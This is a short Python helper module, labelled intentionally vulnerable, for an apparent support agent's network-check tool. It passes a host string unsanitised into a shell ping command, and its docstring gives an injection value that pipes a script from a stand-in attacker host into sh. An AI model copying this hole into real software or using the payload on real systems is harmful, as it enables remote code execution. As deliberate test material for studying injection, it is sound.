"""Operational helpers used by the support agent's tools (INTENTIONALLY VULNERABLE)."""

import subprocess


def run_network_check(host: str) -> str:
    """Ping ``host`` once and return the output.

    ``host`` is interpolated into a shell command, so a value such as
    ``example.com; curl attacker.example | sh`` executes arbitrary commands.
    """
    completed = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True, text=True, timeout=10)
    return completed.stdout
